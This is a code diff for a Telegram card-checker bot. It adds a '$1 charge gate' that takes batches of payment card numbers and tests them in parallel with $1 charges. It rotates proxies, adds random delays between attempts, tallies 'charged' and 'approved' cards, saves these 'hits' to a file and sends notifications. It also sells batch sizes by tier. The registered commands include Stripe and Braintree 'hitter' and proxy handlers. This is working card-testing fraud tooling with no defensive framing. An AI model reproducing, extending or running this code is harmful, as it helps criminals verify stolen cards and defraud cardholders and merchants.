+            parse_mode=ParseMode.HTML)
+        return
+
+    cards = []
+    for tok in " ".join(context.args).split():
+        c = card_formatter.extract_single_card_from_text(tok)
+        if c:
+            cards.append(c)
+
+    if not cards:
+        await message.reply_text("❌ No valid cards found.")
+        return
+
+    max_batch = user_manager.get_max_batch_size(user_id)
+    if len(cards) > max_batch:
+        cards = cards[:max_batch]
+        await message.reply_text(f"⚠️ Your tier allows max {max_batch} cards. Truncating.")
+
+    can_proceed, error_msg = await check_and_deduct_mass_credits(user_id, update, context, len(cards))
+    if not can_proceed:
+        await message.reply_text(error_msg, parse_mode=ParseMode.HTML)
+        return
+
+    try:
+        await message.delete()
+    except Exception:
+        pass
+
+    await mass_check_st1_charge_logic(update, context, cards, None)
+
+
+async def mass_check_st1_charge_logic(update: Update, context: ContextTypes.DEFAULT_TYPE,
+                                      cards: list, progress_msg=None):
+    """Mass check logic for the ST1 $1 charge gate."""
+    u_id = update.effective_user.id
+    message = update.effective_message
+    total = len(cards)
+
+    print(f"\n{'='*80}\n🚀 [ST1 $1 MASS] user={u_id} cards={total}\n{'='*80}")
+
+    user_proxies = []
+    if user_manager.can_use_proxy(u_id):
+        if u_id in autosopi_proxy_tracker.working_proxies and autosopi_proxy_tracker.working_proxies[u_id]:
+            user_proxies = autosopi_proxy_tracker.working_proxies[u_id]
+
+    stats = {"charged": 0, "approved": 0, "declined": 0, "errors": 0, "total": total, "processed": 0}
+    start_time = time.time()
+    proxy_index = 0
+
+    try:
+        st1_charge_active_tasks[u_id] = True
+        tier = user_manager.get_tier(u_id)
+
+        # 5 cards checked in parallel
+        CONCURRENCY = 5
+
+        charged_emoji = premium_emoji(PREMIUM_EMOJI_IDS["charged"], "🔥")
+        approved_emoji = premium_emoji(PREMIUM_EMOJI_IDS["approved"], "✅")
+        dead_emoji = premium_emoji(PREMIUM_EMOJI_IDS["declined"], "❌")
+        errors_emoji = premium_emoji(PREMIUM_EMOJI_IDS["error"], "⚠️")
+
+        if progress_msg is None:
+            progress_text = (
+                f"<b>Gateway</b> ➛ ST1 $1\n"
+                f"<b>Status</b> ➛ STARTING...\n"
+                f"<b>Checked</b> ➛ 0/{total}\n"
+                f"<b>Charged</b> ➛ 0 {charged_emoji}\n"
+                f"<b>Approved</b> ➛ 0 {approved_emoji}\n"
+                f"<b>Declined</b> ➛ 0 {dead_emoji}\n"
+                f"<b>Errors</b> ➛ 0 {errors_emoji}\n"
+                f"<b>Time</b> ➛ 0s"
+            )
+            progress_msg = await message.reply_text(progress_text, parse_mode=ParseMode.HTML)
+
+        semaphore = asyncio.Semaphore(CONCURRENCY)
+        stats_lock = asyncio.Lock()
+        processed_count = 0
+
+        async def update_progress(current: int):
+            if current > 0 and current < total and current % 10 != 0:
+                return
+            elapsed = int(time.time() - start_time)
+            minutes, seconds = elapsed // 60, elapsed % 60
+            time_str = f"{minutes}m {seconds}s" if minutes > 0 else f"{seconds}s"
+            status_text = "FINISHED ✅" if current >= total else f"PROCESSING {current}/{total}"
+            progress_text = (
+                f"<b>Gateway</b> ➛ ST1 $1\n"
+                f"<b>Status</b> ➛ {status_text}\n"
+                f"<b>Checked</b> ➛ {current}/{total}\n"
+                f"<b>Charged</b> ➛ {stats['charged']} {charged_emoji}\n"
+                f"<b>Approved</b> ➛ {stats['approved']} {approved_emoji}\n"
+                f"<b>Declined</b> ➛ {stats['declined']} {dead_emoji}\n"
+                f"<b>Errors</b> ➛ {stats['errors']} {errors_emoji}\n"
+                f"<b>Time</b> ➛ {time_str}"
+            )
+            try:
+                await progress_msg.edit_text(progress_text, parse_mode=ParseMode.HTML)
+            except Exception:
+                pass
+
+        async def process_single_card(card: str, idx: int):
+            nonlocal processed_count, proxy_index
+            await asyncio.sleep(random.uniform(0.1, 0.3))
+            async with semaphore:
+                start = time.time()
+
+                proxy_str = None
+                if user_proxies:
+                    proxy_str = user_proxies[proxy_index % len(user_proxies)]
+                    proxy_index += 1
+
+                result = await check_card_st1_charge(card, proxy_str)
+                elapsed = time.time() - start
+
+                bin_info = await get_bin_info(card)
+                status_category = result.get("status_category", "declined")
+
+                async with stats_lock:
+                    processed_count += 1
+                    if status_category == "charged":
+                        stats["charged"] += 1
+                        stats["approved"] += 1
+                    elif status_category == "approved":
+                        stats["approved"] += 1
+                    elif status_category == "declined":
+                        stats["declined"] += 1
+                    else:
+                        stats["errors"] += 1
+
+                    if processed_count % 10 == 0 or processed_count == total:
+                        await update_progress(processed_count)
+
+                if status_category in ("charged", "approved"):
+                    ui, _ = format_st1_charge_response(result, card, bin_info)
+                    try:
+                        await message.reply_text(ui, parse_mode=ParseMode.HTML)
+                    except Exception:
+                        pass
+
+                    await save_hit_to_file(
+                        card=card, gateway="ST1 $1",
+                        response=result.get("response", "Approved"),
+                        price="$1.00",
+                        bin_info=bin_info, user_id=u_id, user_tier=tier)
+
+                    if status_category == "charged":
+                        user_data = user_manager.get_user(u_id)
+                        await send_hit_notification(
+                            context=context, gateway="ST1 $1", card=card,
+                            response=result.get("response", "Charged"),
+                            price="$1.00",
+                            user=user_data, bin_info=bin_info, status_category="charged")
+                        user_manager.increment_hits(u_id)
+
+                user_manager.increment_checks(u_id, 1)
+                return result, card
+
+        tasks = [process_single_card(card, idx) for idx, card in enumerate(cards)]
+        for coro in asyncio.as_completed(tasks):
+            if u_id not in st1_charge_active_tasks:
+                break
+            try:
+                await coro
+            except Exception as e:
+                print(f"❌ [ST1 $1] task error: {e}")
+                async with stats_lock:
+                    stats["errors"] += 1
+
+        if u_id in st1_charge_active_tasks:
+            total_time = time.time() - start_time
+            minutes, seconds = int(total_time // 60), int(total_time % 60)
+            skull_emoji = premium_emoji(PREMIUM_EMOJI_IDS["skull"], "💀")
+            summary = (
+                f"{skull_emoji} <b>ST1 $1 Mass Check Complete</b>\n\n"
+                f"{charged_emoji} <b>Charged</b> ➛ {stats['charged']}\n"
+                f"{approved_emoji} <b>Approved</b> ➛ {stats['approved']}\n"
+                f"{dead_emoji} <b>Declined</b> ➛ {stats['declined']}\n"
+                f"{errors_emoji} <b>Errors</b> ➛ {stats['errors']}\n"
+                f"📝 <b>Total</b> ➛ {total}\n"
+                f"⏱️ <b>Time</b> ➛ {minutes}m {seconds}s\n"
+                f"{skull_emoji} <b>Bot</b> ➛ @BLADESARKS_V3bot"
+            )
+            await update_progress(total)
+            await message.reply_text(summary, parse_mode=ParseMode.HTML)
+
+        return stats
+
+    except Exception as e:
+        print(f"❌ ST1 $1 mass check error: {e}")
+        traceback.print_exc()
+        try:
+            if progress_msg:
+                await progress_msg.edit_text(f"❌ Error: {str(e)[:100]}")
+        except Exception:
+            pass
+    finally:
+        st1_charge_active_tasks.pop(u_id, None)
+        print(f"🏁 [ST1 $1 Mass] Session ended for user {u_id}")
+
+
+
+
 def main():
     print("=" * 80)
     print("💰 ULTRA MULTI-USER CARD CHECKER BOT - v3.0")
@@ -84722,6 +85975,9 @@ def main():
     
     # ============ WHOP COMMANDS ============
     app.add_handler(CommandHandler("whop", whop_command))
+    # ============ HIT OPTOUT COMMANDS ============
+    app.add_handler(CommandHandler("offhit", offhit_command))
+    app.add_handler(CommandHandler("onhit", onhit_command))
     
     # ============ STRIPE CO COMMANDS ============
     app.add_handler(CommandHandler("stco", stco_command))
@@ -84748,6 +86004,9 @@ def main():
     
     # ============ STRIPE HITTER PROXY COMMANDS ============
     app.add_handler(CommandHandler("addproxy", addproxy_stripe_command))
+    # ============ BRAINTREE (KAFFN8) ACCOUNT MANAGEMENT ============
+    app.add_handler(CommandHandler("addbt", addbt_command))
+    app.add_handler(CommandHandler("rbt", rbt_command))
     app.add_handler(CommandHandler("removeproxy", removeproxy_stripe_command))
     app.add_handler(CommandHandler("proxy", proxy_stripe_check_command))
     
@@ -84835,6 +86094,10 @@ def main():
     
     app.add_handler(CommandHandler("st",  strip5_single,  block=False))
     app.add_handler(CommandHandler("mst", strip5_mass,    block=False))
+
+    # ============ ST1 $1 CHARGE GATE ============
+    app.add_handler(CommandHandler("st1",  single_check_st1_charge,     block=False))
+    app.add_handler(CommandHandler("mst1", mass_check_st1_charge_command, block=False))
 
     app.add_handler(CommandHandler("sq",  sq_single,  block=False))
     app.add_handler(CommandHandler("msq", sq_mass,    block=False))
